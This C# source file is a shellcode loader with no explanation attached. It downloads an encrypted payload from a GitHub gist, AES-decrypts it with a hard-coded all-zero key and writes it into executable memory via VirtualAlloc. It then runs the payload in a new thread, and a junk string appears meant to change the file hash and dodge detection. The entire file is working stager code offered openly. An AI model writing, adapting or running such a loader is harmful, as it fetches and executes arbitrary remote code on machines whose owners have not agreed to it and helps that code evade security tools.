using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Security.Cryptography;
using System.IO;

public class Program
{
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32")]
	private static extern void RtlMoveMemory(UInt32 destination, UInt32 source, UInt32 length);

	[DllImport("kernel32")]
	private static extern bool VirtualProtect(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

	public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
	{
		using (var aes = Aes.Create())
		{
			aes.KeySize = 128;
			aes.BlockSize = 128;
			aes.Key = key;
			aes.IV = iv;

			using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
			{
				using (var ms = new MemoryStream())
				using (var cryptoStream = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
				{
					cryptoStream.Write(data, 0, data.Length);
					cryptoStream.FlushFinalBlock();

					return ms.ToArray();
				}
			}
		}
	}

	public static void Main(String[] args)
	{
		string hash_randomizer = "20gh02fwrghH34r4580";

		var webClient = new WebClient();
		string page = webClient.DownloadString("https://gist.githubusercontent.com/m1kemu/f1f23894003582693282b7db6447b4ff/raw/17bd5b91f8984a1dd63974a46ed1e8a8eb7fa088/download_me_csharp.txt");
		string[] message = page.Split(':');
		string data_b64 = message[0];
		string iv_b64 = message[1];

		var key = new byte[16] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

		var sc = Decrypt(Convert.FromBase64String(data_b64), key, Convert.FromBase64String(iv_b64));

		IntPtr thread = IntPtr.Zero;
		UInt32 threadid = 0;

		UInt32 addr = VirtualAlloc(0, (UInt32)sc.Length, 0x1000, 0x40);
		Marshal.Copy(sc, 0, (IntPtr)(addr), sc.Length);
		VirtualProtect(addr, (UInt32)sc.Length, 0x20, 0);
		thread = CreateThread(0, 0, addr, IntPtr.Zero, 0, ref threadid);
		WaitForSingleObject(thread, 0xFFFFFFFF);

		return;
	}
}
